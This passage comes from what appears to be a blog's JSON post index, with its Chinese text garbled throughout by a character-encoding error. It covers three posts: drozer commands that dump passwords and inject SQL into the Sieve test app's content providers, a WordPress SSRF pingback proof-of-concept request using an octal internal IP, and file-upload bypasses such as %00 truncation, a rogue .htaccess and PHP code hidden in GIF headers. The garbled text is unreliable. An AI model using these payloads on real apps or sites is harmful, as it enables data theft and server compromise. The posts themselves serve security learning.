â€œexportedâ€è¡¨ç¤ºç»„ä»¶å¯ä»¥è¢«å…¶ä»–Appä½¿ç”¨ã€‚ services is debuggableè¡¨ç¤ºæˆ‘ä»¬å¯ä»¥ç”¨adbç»‘å®šä¸€ä¸ªè°ƒè¯•å™¨åˆ°è¿›ç¨‹ã€‚ 2.4 è¿›ä¸€æ­¥è·å–Attack Surfaceçš„ä¿¡æ¯å¦‚è¿›ä¸€æ­¥è·å–ativityç»„å»ºçš„attack surfaceä¿¡æ¯çš„å‘½ä»¤æ˜¯ï¼š1run app.activity.info -a com.mwr.example.sieve 2.5 å¯åŠ¨Activitiesä¸Šå›¾çš„PWListå’ŒFileSelectActivityæ˜¯exportedå¹¶ä¸”ä¸éœ€è¦ä»»ä½•æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨drozerå¯åŠ¨ä»–ä»¬ï¼Œæ¯”å¦‚æ„Ÿè§‰PWListè¿™ä¸ªå«é‡‘é‡åº”è¯¥å¤§ä¸€ç‚¹ï¼Œæ‰€ä»¥å°±å¯åŠ¨å®ƒäº†ï¼Œå‘½ä»¤æ˜¯ï¼š1run app.activity.start â€“component com.mwr.example.sieve com.mwr.example.sieve.PWList 2.6 ä»Content Providerä¸­è·å–ä¿¡æ¯æ¥ä¸Š2.3èŠ‚ï¼Œè¿›ä¸€æ­¥è·å–content providerçš„attact surfaceçš„ä¿¡æ¯çš„å‘½ä»¤æ˜¯ï¼š1run app.provider.info -a com.mwr.example.sieve ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°2.3èŠ‚ä¸­ä¸¤ä¸ªexportedçš„content providerçš„å…·ä½“ä¿¡æ¯ï¼ŒåŒ…æ‹¬åå­—ï¼Œæƒé™ï¼Œè®¿é—®è·¯å¾„ç­‰ã€‚ 2.6.1 æŸ¥æ‰¾å¯ä»¥è®¿é—®Content Providerçš„URIï¼ˆæ•°æ®æ³„æ¼ï¼‰ä»ä¸ŠèŠ‚å›¾ä¸­æˆ‘ä»¬çŒœæµ‹DBContentProviderä¼šæœ‰æŸç§æ ¼å¼çš„æ•°æ®åº“ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“å…¶ä¸­çš„æ•°æ®æ˜¯å¦‚ä½•ç»„ç»‡çš„ã€‚Content URIå¿…é¡»æ˜¯ â€œcontent:///â€ çš„å½¢å¼,å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ éƒ¨åˆ†çš„content URIsæ¥è®¿é—®DBcontent Providerã€‚ ä¸Šå›¾å­˜åœ¨ä¸€ä¸ªéœ€è¦READ_KEYSå’ŒWRITE_KEYSæƒé™æ‰èƒ½è¯»å’Œå†™çš„â€œ/Keysâ€çš„è·¯å¾„ã€‚drozerçš„scanneræ¨¡å—æä¾›äº†ä¸€äº›æ–¹æ³•å»çŒœæµ‹å¯èƒ½å­˜åœ¨çš„content URIsï¼š1run scanner.provider.finduris -a com.mwr.example.sieve ä¸Šå›¾ä¸­æ£€æµ‹å‡ºäº†å¯ä»¥è®¿é—®contentçš„URIï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥ç”¨drozerçš„å…¶ä»–æ¨¡å—å’ŒURIä»contentä¸­è·å–ï¼Œç”šè‡³æ›´æ”¹ä¿¡æ¯ã€‚ å¦‚ï¼š1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“vertical å¦‚ä¸Šå›¾æˆ‘ä»¬è·å–äº†ç”¨æˆ·åï¼Œé‚®ç®±å¸å·ï¼Œå’ŒBase64ç¼–ç çš„å¯†ç å­—ç¬¦ä¸²ã€‚ 2.6.2 è¿›è¡ŒSQLæ³¨å…¥Androidæ“ä½œç³»ç»Ÿå»ºè®®ä½¿ç”¨SQLiteæ•°æ®åº“å­˜å‚¨ç”¨æˆ·æ•°æ®ã€‚SQLiteæ•°æ®åº“ä½¿ç”¨SQLè¯­å¥ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡ŒSQLæ³¨å…¥ã€‚ ä½¿ç”¨projectionå‚æ•°å’Œselecitonå‚æ•°å¯ä»¥ä¼ é€’ä¸€äº›ç®€å•çš„SQLæ³¨å…¥è¯­å¥åˆ°Content providerã€‚å¦‚ï¼š123run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“projection â€œâ€˜â€run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“selection â€œâ€˜â€ ä¸Šé¢ä¸¤æ¡å‘½ä»¤æ‰§è¡ŒåAndroidè®¾å¤‡è¿”å›äº†éå¸¸è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯ã€‚ä½¿ç”¨Sqlæ³¨å…¥åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰æ•°æ®è¡¨ï¼š1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“projection â€œ* FROM SQLITE_MASTER WHERE type=â€™tableâ€™;â€“â€œ ä½¿ç”¨SQLæ³¨å…¥åˆ—å‡ºæ•°æ®è¡¨çš„å†…å®¹ï¼š1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“projection â€œ* FROM Key;â€“â€œ ä½¿ç”¨SQLæ³¨å…¥åˆ—å‡ºæ•°æ®è¡¨çš„å†…å®¹ï¼š1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“projection â€œ* FROM Key;â€“â€œ 2.6.3 ä»File System-Backed Content Providersè·å–ä¿¡æ¯File System-backed Content Provideræä¾›äº†è®¿é—®åº•å±‚æ–‡ä»¶ç³»ç»Ÿçš„æ–¹æ³•ï¼ŒAndroidæ²™ç›’ä¼šé˜»æ­¢Appå…±äº«æ–‡ä»¶å…è®¸ï¼Œè€ŒFile System-backed Content Providerå…è®¸Appå…±äº«æ–‡ä»¶ã€‚ å¯¹äºsieveæ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥æ¨æµ‹å‡ºçš„FileBackupProviderå°±æ˜¯ä¸€ä¸ªfile system-backed content providerã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨drozerçš„app.provider.readæ¨¡å—æŸ¥çœ‹æŸä¸ªæ–‡ä»¶ï¼š1run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts å¯ä»¥ä½¿ç”¨app.provider.downloadä¸‹è½½æ–‡ä»¶1run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db 2.6.4 æ£€æŸ¥Content Providerçš„è„†å¼±æ€§æ£€æŸ¥æ˜¯å¦æœ‰SQLæ³¨å…¥ï¼š1run scanner.provider.injection -a com.mwr.example.sieve æ£€æŸ¥æ˜¯å¦å­˜åœ¨éå†æ–‡ä»¶çš„æ¼æ´1run scanner.provider.traversal -a com.mwr.example.sieve æ€»ç»“ä½“ä¼šï¼šæˆ‘è§‰å¾—åœ¨åˆšå¼€å§‹è·å–äº†è½¯ä»¶åŒ…çš„åŸºæœ¬ä¿¡æ¯åï¼Œå°±å…ˆç”¨æ¨¡å—scanneré‡Œé¢çš„å·¥å…·æ‰«ä¸€æ‰«ï¼Œæ‰¾åˆ°ä¸€äº›æ¼æ´æˆ–è€…åˆ©ç”¨ç‚¹åå†è¿›è¡Œä¸‹ä¸€æ­¥ã€‚ 2.7 å’ŒServicesäº¤äº’è·å–æ˜¯exportedçŠ¶æ€çš„servicesçš„å‘½ä»¤ï¼š1run app.service.info -a com.mwr.example.sieve å…³äºServicesçš„æ¨¡å—ï¼šå¦‚å‘æŸä¸ªæœåŠ¡å‘é€ä¿¡æ¯ï¼š1run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService â€“msg 1 5 3 2.8 å…¶ä»–å¸¸ç”¨æ¨¡å— shell.start åœ¨Androidè®¾å¤‡ä¸Šå¼€å¯ä¸€ä¸ªäº¤äº’å¼Linux Shell tools.file.upload / tools.file.downloa tools.setup.busybox / tools.setup.minimalsu å®‰ è£…busyboxæˆ–è€…minimalsuåˆ°Androidè®¾å¤‡ä¸Š å‚è€ƒé“¾æ¥ï¼šhttps://blog.ropnop.com/installing-drozer-on-os-x-el-capitan/http://www.droidsec.cn/%E4%BD%BF%E7%94%A8drozer%E5%AF%B9android%E5%BA%94%E7%94%A8%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/"},{"title":"wordpress SSRF <4.5","permalink":"http://blog.0kami.cn/2016/08/19/old-old-wordpress-ssrf-4-4-2/","text":"æ¦‚è¿°å‰å‡ å¤©ï¼Œwordpressçˆ†å‡ºä¸€ä¸ªSSRFçš„æ¼æ´ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼ŒæŸ¥é˜…äº†ä¸€ä¸‹ï¼Œç½‘ä¸Šå¹¶æ²¡æœ‰è¯¦ç»†çš„åˆ©ç”¨æ–¹å¼ã€‚ä»¥å‰ä¹Ÿæ²¡æ€ä¹ˆæ¥è§¦è¿‡wordpressï¼Œçœ‹äº†ä¸€ä¸‹å—å½±å“çš„ä»£ç ï¼Œè®°å½•ä¸€ä¸‹è¿‡ç¨‹ã€‚ ipåœ°å€çš„å‡ ç§è¡¨ç¤ºæ–¹å¼ipåœ°å€åŸŸåæœ‰å¤šç§è¡¨ç¤ºæ–¹å¼ï¼Œæµè§ˆå™¨éƒ½èƒ½è¯†åˆ«å‡ºæ¥ã€‚ å¸¸è§çš„ipåœ°å€åŸŸåè¡¨ç¤ºæ–¹æ³• ç‚¹åˆ†åè¿›åˆ¶è¡¨ç¤ºæ³•ï¼Œä¾‹å¦‚192.168.1.2 äºŒè¿›åˆ¶è¡¨ç¤ºæ³•ä¾‹å¦‚11000000101010000000000100000010ï¼Œè¡¨ç¤º192.168.1.2 éå¸¸è§ipåœ°å€åŸŸåè¡¨ç¤ºæ–¹æ³• æ•´æ•°å‹ï¼šå°†ä¸Šè¿°çš„äºŒè¿›åˆ¶ç›´æ¥è½¬æ¢æˆæ•´æ•°3232235778ï¼Œæµè§ˆå™¨é€šè¿‡è®¿é—®http://3232235778 è§£æä¸º192.168.1.2ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥é€šè¿‡å…¬å¼192*256^3+168*256^2+1*256+2=3232235778æ¢ç®— å…«è¿›åˆ¶å‹ï¼šå°†IP 192.168.1.2æ¢æˆ8è¿›åˆ¶0300.0250.01.02ï¼Œåœ¨å‰é¢åŠ ä¸Š0è¡¨ç¤º8è¿›åˆ¶ åå…­è¿›åˆ¶å‹ï¼šå°†IP 192.168.1.2æ¢æˆ16è¿›åˆ¶0xc0.0xA8.1.2ï¼Œåœ¨å‰é¢åŠ ä¸Š0xè¡¨ç¤º16è¿›åˆ¶ æ··åˆå‹ï¼šå³ä»¥ä¸Šçš„å‡ ç§æ–¹å¼çš„ç»“åˆï¼Œ0300.0xA8.1.0x02 ä¸‹é¢å°±æ˜¯é€šè¿‡å…«è¿›åˆ¶ç»•è¿‡æ£€æµ‹ã€‚ ä»£ç è¯¦æƒ…æ¼æ´æˆå› å¤„508 wp_http_validate_url å‡½æ•°1234567891011121314151617......if ( ! $same_host ) &#123; $host = trim( $parsed_url['host'], '.' ); if ( preg_match( '#^\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;$#', $host ) ) &#123; $ip = $host; &#125; else &#123; $ip = gethostbyname( $host ); if ( $ip === $host ) // Error condition for gethostbyname() $ip = false; &#125; if ( $ip ) &#123; $parts = array_map( 'intval', explode( '.', $ip ) ); if ( 127 === $parts[0] || 10 === $parts[0] || 0 === $parts[0] || ( 172 === $parts[0] &amp;&amp; 16 &lt;= $parts[1] &amp;&amp; 31 &gt;= $parts[1] ) || ( 192 === $parts[0] &amp;&amp; 168 === $parts[1] ) ) &#123; ...... è¿™é‡Œçš„ä»£ç é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$åˆ¤æ–­ipæ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•åˆ™é€šè¿‡ç½‘ç»œè·å–ipçš„å€¼ã€‚ä¸‹é¢çš„ifåˆ¤æ–­åˆ™æ˜¯ç”¨æ¥é˜²æ­¢ç»™çš„urlä¸ºå†…ç½‘ipï¼Œä½†æ˜¯ä¸Šè¿°çš„æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥é€šè¿‡8è¿›åˆ¶ç»•è¿‡å†…ç½‘é™åˆ¶ã€‚123456if ( empty( $parsed_url['port'] ) ) return $url; $port = $parsed_url['port']; if ( 80 === $port || 443 === $port || 8080 === $port ) return $url; å†æ¥ä¸‹æ¥å¯ä»¥çœ‹åˆ°ç¨‹åºåˆå¯¹ç«¯å£åšäº†é™åˆ¶ï¼Œåªèƒ½æ‰«æ80,443,8080ç«¯å£ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œé€šè¿‡8è¿›åˆ¶ç»•è¿‡ipåˆ¤æ–­ï¼Œå¯ä»¥æ‰«æå†…ç½‘çš„80,443,8080æ‰¾ä¸€ä¸‹è°ƒç”¨çš„ä½ç½®,å¯ä»¥æ‰¾åˆ°class-wp-xmlrpc-server.phpé€šè¿‡wp_safe_remote_getè°ƒç”¨äº†getå‡½æ•°ï¼Œgetå‡½æ•°ä½¿ç”¨äº†wp_http_validate_urlï¼Œä»è€Œé€ æˆssrf åˆ©ç”¨åˆ©ç”¨çš„æ–¹å¼ä¸ºé€šè¿‡xmlrpc.phpä¸­pingback.pingåŠŸèƒ½æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚POC123456789101112131415161718POST /cms/wordpress/wp442/xmlrpc.php HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 321&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://012.10.10.111:8080/testvul&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://localhost/cms/wordpress/wp442/2016/08/19/hello-world/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt; è¿™é‡Œè®¾ç½®10.10.10.111ä¸ºå—å®³è€… æ€»ç»“åœ¨æµ‹è¯•ä¸­å‘ç°åªèƒ½å¯¹10.x.x.xçš„å†…ç½‘ipè¿›è¡Œåˆ©ç”¨ï¼Œå› ä¸ºæ­£åˆ™çš„åŸå› è‡³å¤šåªèƒ½æœ‰3ä½æ•°å­—ï¼Œä¸€ä½éœ€è¦ä¸º0æ¥è¡¨ç¤º8è¿›åˆ¶ï¼Œæ‰€ä»¥åˆ©ç”¨åªæœ‰10,å¹¶ä¸”åªèƒ½æ‰«æ80,443,8080ç«¯å£ã€‚ç”±äºåˆ©ç”¨ä¸­ä¸å›æ˜¾ï¼Œä¹Ÿå¾ˆéš¾ç¡®å®šæ˜¯å¦æˆåŠŸåˆ©ç”¨ã€‚æ‰€ä»¥è¿™ä¸ªæ´å¯èƒ½å±å®³æ¯”è¾ƒå°ï¼ˆå¤ªèœäº†ï¼Œæƒ³ä¸åˆ°å…¶ä»–çš„åˆ©ç”¨æ–¹å¼ï¼Œæœ‰å…¶ä»–çš„åˆ©ç”¨æ–¹å¼è®°å¾—åˆ†äº«å•Šï¼ï¼ï¼ï¼‰è¿˜æœ‰ä¸€ç§åˆ©ç”¨å°±æ˜¯å¼€å¯xmlrpcçš„wordpressç«™å¯ä»¥è¢«é€šè¿‡pingback.pingæ–¹æ³•æ¥DDOSï¼Œè¿™ä¸ªä»¥å‰å°±æœ‰äººæå‡ºæ¥äº†ã€‚ å‚è€ƒhttp://xlab.baidu.com/wordpress/https://virusdefender.net/index.php/archives/733/"},{"title":"æ–‡ä»¶ä¸Šä¼ å­¦ä¹ æ€»ç»“","permalink":"http://blog.0kami.cn/2016/07/04/old-old-file-upload/","text":"æ¦‚è¿°è¿™å‡ å¤©ç©ºä¸‹æ¥æ ¹æ®ä¸Šä¼ æ”»å‡»æ¡†æ¶å­¦ä¹ æ€»ç»“ä¸€ä¸‹ä¸Šä¼ æ”»å‡»ã€‚ ä¸Šä¼ æ£€æµ‹æµç¨‹ å®¢æˆ·ç«¯javascriptæ£€æµ‹ï¼ˆæ£€æµ‹æ–‡ä»¶æ‰©å±•åä¸ºä¸»ï¼‰ æœåŠ¡ç«¯MIMEç±»å‹æ£€æµ‹ï¼ˆæ£€æµ‹Content-typeå†…å®¹ï¼‰ æœåŠ¡ç«¯ç›®å½•è·¯åŠ²æ£€æµ‹ï¼ˆæ£€æµ‹è·Ÿpathç›¸å…³çš„å†…å®¹ï¼‰ æœåŠ¡ç«¯æ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼ˆæ£€æµ‹è·Ÿæ–‡ä»¶åç¼€ç›¸å…³çš„å†…å®¹ï¼‰ æœåŠ¡ç«¯æ–‡ä»¶å†…å®¹æ£€æµ‹ï¼ˆæ£€æµ‹å†…å®¹æ˜¯å¦åˆæ³•æˆ–å«æœ‰æ¶æ„ä»£ç ï¼‰ å®¢æˆ·ç«¯javascriptæ£€æµ‹é€šå¸¸æ­¤ç±»æ£€æµ‹ä¼šåœ¨jsæ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªæ£€æµ‹çš„å‡½æ•°ï¼Œä¸€èˆ¬å¯¹ä¸Šä¼ çš„æ–‡ä»¶åç¼€ååšæ£€æµ‹ï¼Œä¾‹å¦‚ä»…å…è®¸ä¸Šä¼ png,jpg,gifç­‰ç±»å‹çš„æ–‡ä»¶ï¼Œå¦‚æœæ£€æµ‹åˆ°çš„æ–‡ä»¶åç¼€åä¸æ˜¯åœ¨è¿™äº›åå•å†…ï¼Œåˆ™ä¸å‘æœåŠ¡å™¨ç«¯ä¼ è¾“æ–‡ä»¶å†…å®¹ã€‚è¿™ç±»æ£€æµ‹ä¹Ÿæ˜¯æœ€å®¹æ˜“ç»•è¿‡çš„æ£€æµ‹ï¼Œå¯ä»¥ä½¿ç”¨firebugä¹‹ç±»çš„æ’ä»¶æŠŠå®ƒç¦æ‰æˆ–è€…é€šè¿‡burpä¹‹ç±»çš„ä»£ç†å·¥å…·è¿›è¡Œç»•è¿‡æäº¤ã€‚ä½¿ç”¨burpï¼Œä¸Šä¼ æ—¶æä¾›ä¸€ä¸ªç™½åå•å†…çš„åç¼€ï¼Œé€šè¿‡burpæ‹¦åŒ…ï¼Œå¹¶ä¿®æ”¹åç¼€åæäº¤ æœåŠ¡ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆMIMEç±»å‹æ£€æµ‹ï¼‰12345678910111213&lt;?php if($_FILES['userfile']['type'] != \"image/gif\") &#123; //æ£€æµ‹Content-type echo \"Sorry, we only allow uploading GIF images\"; exit; &#125; $uploaddir = 'uploads/'; $uploadfile = $uploaddir . basename($_FILES['userfile']['name']); if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) &#123; echo \"File is valid, and was successfully uploaded.\\n\"; &#125; else &#123; echo \"File uploading failed.\\n\"; &#125;?&gt; ä¸Šé¢ä¸ºphpåç«¯æ£€æµ‹MIMEç±»å‹çš„ä¸€ä¸ªä¾‹å­é€šè¿‡åˆ¤æ–­$_FILES[&#39;userfile&#39;][&#39;type&#39;] != &quot;image/gif&quot;æ¥ä¿è¯ä¸Šä¼ çš„ç±»å‹ä¸ºgifç±»å‹çš„æ–‡ä»¶ã€‚ç»•è¿‡è¿™ä¸€ç±»å‹çš„æ£€æµ‹ï¼Œå¯ä»¥é€šè¿‡burpæ‹¦åŒ…ï¼Œå°†åŸContent-Typeç±»å‹è¯¥ä¸ºç¬¦åˆè¦æ±‚çš„image/gifç±»å‹ã€‚ æœåŠ¡ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆç›®å½•è·¯åŠ²æ£€æµ‹ï¼‰æœ‰ä¸€äº›webåº”ç”¨ç¨‹åºæœ‰å¤šä¸ªæ–‡ä»¶å¤¹ç”¨æ¥å­˜å‚¨å›¾ç‰‡æ–‡ä»¶ï¼Œæ‰€ä»¥ä¸ºäº†æ ‡è¯†ä¸Šä¼ çš„å›¾ç‰‡æ˜¯å±äºå“ªä¸ªæ–‡ä»¶å¤¹çš„ï¼Œä¸Šä¼ æ–‡ä»¶æ—¶ä¼šå¸¦ä¸Šæ–‡ä»¶å­˜å‚¨è·¯åŠ²ã€‚è€Œæ­¤æ—¶å¦‚æœå¯¹æ–‡ä»¶ç›®å½•è·¯åŠ²æ£€æµ‹ä¸å¤Ÿå®Œå…¨ï¼Œå¯ä»¥é€šè¿‡æˆªæ–­æ”»å‡»ã€‚ï¼ˆå¦‚%00,windowsä¸‹%80-%90ï¼‰å¦‚ä¸Šä¼ æ—¶æä¾›å­˜å‚¨è·¯åŠ²ä¸ºimage/20160704/å¯ä»¥é€šè¿‡ä¿®æ”¹ä¸ºimage/20160704/evil.php%00æ¥è¾¾åˆ°æˆªæ–­ç›®çš„ã€‚åç«¯ç¨‹åºä¼šå°†è¯¥è·¯åŠ²è¿æ¥ä¸ºimage/20160704/evil.php%00filename.gif00æˆªæ–­å¯¼è‡´æœ€ç»ˆå­˜å‚¨çš„æ–‡ä»¶åä¸ºevil.php æœåŠ¡å™¨ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆæ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼‰ é»‘åå•æ£€æµ‹é»‘åå•æ£€æµ‹é€šå¸¸ä¼šæœ‰ä¸€ä¸ªæ–‡ä»¶åç¼€åé»‘åå•ï¼ˆä¾‹å¦‚html|htm|php|php2|php3|php4|php5â€¦ï¼‰ä½†æ˜¯é€šå¸¸é»‘åå•æ£€æµ‹ä¸èƒ½åŒ…å«æ‰€æœ‰çš„æ¶æ„è„šæœ¬åç¼€ï¼Œé˜²æŠ¤éš¾åº¦ä¼šæ¯”è¾ƒå¤§ï¼Œæ¨èä½¿ç”¨ç™½åå•ç»•è¿‡çš„æ–¹æ³•ï¼š æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ï¼ˆä¾‹å¦‚ç”¨Phpï¼ŒAspç­‰ï¼‰ åå•åˆ—è¡¨ç»•è¿‡(ç”¨é»‘åå•ä¸­æœªæåŠçš„æ–‡ä»¶åç¼€æ¥ç»•è¿‡ï¼Œå¦‚asaï¼Œcerç­‰ä¸å¸¸è§çš„æ–‡ä»¶åç¼€) 0x00æˆªæ–­ï¼ˆaspä¸‹å¯ä»¥å°è¯•ä½¿ç”¨,aspä¸ºä»åå¾€å‰æ‰«ææ‰©å±•åï¼Œevil.asp%00.jpgï¼Œä¼šè¢«è¯†åˆ«ä¸ºjpgï¼Œåªè¦æ£€æµ‹æ–¹å¼å¦‚è¿™ç§å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼ç»•è¿‡ï¼‰ ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡ï¼ˆåªé€‚ç”¨windowsï¼Œå°†æ–‡ä»¶åæ”¹ä¸ºevil.php.æˆ–evil.php (æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªç©ºæ ¼),åœ¨windowsä¸‹ï¼Œä¸å…è®¸è¿™æ ·çš„å‘½åï¼Œæ‰€ä»¥ä¼šå°†.å’Œç©ºæ ¼è‡ªåŠ¨å»æ‰ï¼‰ .htaccessæ–‡ä»¶æ”»å‡»ï¼ˆé…åˆåå•åˆ—è¡¨ç»•è¿‡ï¼Œä¸Šä¼ ä¸€ä¸ªè‡ªå®šä¹‰çš„.htaccessï¼Œå°±å¯ä»¥è½»æ¾ç»•è¿‡å„ç§æ£€æµ‹ï¼‰ .htaccessæ–‡ä»¶æ”»å‡»å¦‚æœé»‘åå•ä¸­æœªåŒ…å«.htaccessåç¼€çš„å¯ä»¥é€šè¿‡é‡å†™è§£æé…ç½®æ¥è¾¾åˆ°è§£æçš„æ•ˆæœé’ˆå¯¹phpï¼Œä¸Šä¼ è‡ªå®šä¹‰.htaccess123&lt;FilesMatch &quot;haha&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; åŒç›®å½•æœ‰ä¸ªæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªåªæœ‰æ–‡ä»¶åå¹¶åŒ…å«å­—ç¬¦ä¸²â€hahaâ€ï¼Œä½†æ˜¯å´æ— ä»»ä½•æ‰©å±•åçš„æ–‡ä»¶é‡Œé¢çš„å†…å®¹æ˜¯ php ä¸€å¥è¯æœ¨é©¬ï¼Œé€šè¿‡èœåˆ€è¿æ¥å¯ä»¥è§£æphpæˆå› ï¼š åœ¨ PHP manual ä¸­æåˆ°äº†ä¸‹é¢ä¸€æ®µè¯ move_uploaded_file section, there is a warning which states â€˜If the destination file already exists, it will be overwritten.â€™ å¦‚æœ PHP å®‰å…¨æ²¡é…ç½®å¥½ å°±å¯ä»¥é€šè¿‡ move_uploaded_file å‡½æ•°æŠŠè‡ªå·±å†™çš„.htaccess æ–‡ä»¶è¦†ç›–æ‰æœåŠ¡å™¨ä¸Šçš„ è¿™æ ·å°±èƒ½ä»»æ„å®šä¹‰è§£æåå•äº† è§£ææ¼æ´ï¼ˆapacheè§£ææ¼æ´ï¼Œiis6.0è§£ææ¼æ´ï¼Œnginxè§£ææ¼æ´ï¼‰ apacheè§£ææ¼æ´apacheæ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æï¼Œå¦‚æœæœ€å³çš„åç¼€æ— æ³•è§£æï¼Œåˆ™å°è¯•è§£æåä¸€ä¸ªåç¼€ iis6.0è§£ææ¼æ´ æˆå› ä¸ºiis6.0ä¸è§£æ;åé¢çš„ï¼Œæ‰€ä»¥æäº¤evil.asp;.htmlè§£æä¸ºaspç±»å‹ è¿˜æœ‰ä¸€ä¸ªä¸ºIIS6.0çš„00æˆªæ–­æ”»å‡» IIS6.0åŒæ–‡ä»¶ä¸Šä¼  æ–‡ä»¶å¤¹çš„åå­—åŒ…å«.aspåˆ™è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶éƒ½ä»¥aspçš„å½¢å¼æ¥è§£æ iis7.0/7.5è§£ææ¼æ´å¯¹äºphpæœ‰ä¸€ä¸ªç±»ä¼¼Nginxçš„è§£ææ¼æ´evil.jpg/evil.php è§£æevil.jpgä¸­çš„phpä»£ç ï¼Œè¿™ä¸ªæ¼æ´æˆå› åœ¨äºphp-cgiçš„æ¼æ´ nginxè§£ææ¼æ´ å°†phpæ–‡ä»¶æ¢æˆå…¶ä»–å¯ä»¥é€šè¿‡çš„æ–‡ä»¶åç¼€ï¼Œè®¿é—®çš„æ—¶å€™åœ¨åé¢åŠ ä¸Š/.phpï¼Œå³evil.jpg/.phpï¼Œevil.jpgä¼šè§£æä¸ºphpçš„æ ¼å¼ %00æˆªæ–­ å…¶ä»–æ–¹å¼æäº¤å‰å°†filename=â€evil.phpâ€è¯¥ä¸ºâ€evil.phpâ€.jpgâ€ ç™½åå•æ£€æµ‹ 0x00æˆªæ–­ç»•è¿‡ è§£ææ¼æ´ç»•è¿‡ï¼ˆæ–‡ä»¶åä¸è¢«é‡å†™ï¼‰ æœåŠ¡å™¨ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆæ–‡ä»¶å†…å®¹æ£€æµ‹ï¼‰å›¾åƒç±»çš„æ–‡ä»¶å†…å®¹æ£€æµ‹ æ–‡ä»¶å¹»æ•°æ£€æµ‹ï¼ˆå›¾ç‰‡å¤´æ ¼å¼æ£€æµ‹ï¼‰jpgå†…å®¹å¤´value= FF D8 FF E0 00 10 4A 46 49 46gifå†…å®¹å¤´value= 47 49 46 38 39 61pngå†…å®¹å¤´value= 89 50 4E 47 åœ¨æ–‡ä»¶å¤´ååŠ ä¸Šä¸€å¥è¯æœ¨é©¬å°±èƒ½ç»•è¿‡ æ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹ å›¾åƒæ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹å¸¸ç”¨çš„å°±æ˜¯phpçš„getimagesize()å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹å›¾ç‰‡çš„æ³¨é‡ŠåŒºï¼ˆdataåŒºï¼‰æ’å…¥ä¸€å¥è¯ä»£ç ï¼Œå¦‚ä¸‹ï¼š1234GIF89a(...some binary data for image...)&lt;?php phpinfo(); ?&gt;(... skipping the rest of binary data ...) æ–‡ä»¶åŠ è½½æ£€æµ‹ è°ƒç”¨APIæˆ–å‡½æ•°å»è¿›è¡Œæ–‡ä»¶åŠ è½½æµ‹è¯•ï¼Œå¸¸è§çš„æ˜¯å›¾åƒæ¸²æŸ“æµ‹è¯•ï¼ŒäºŒæ¬¡æ¸²æŸ“ï¼Œå¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œå†ä¸‹è½½ä¸‹æ¥ï¼Œdiffä¸€ä¸‹æ‰¾åˆ°ä¸å˜çš„ä½ç½®æ’å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œä½†æˆåŠŸç‡ä¸é«˜ æ€»ç»“è½»é‡çº§æ£€æµ‹ç»•è¿‡æ”»å‡» ç»•è¿‡ javascript 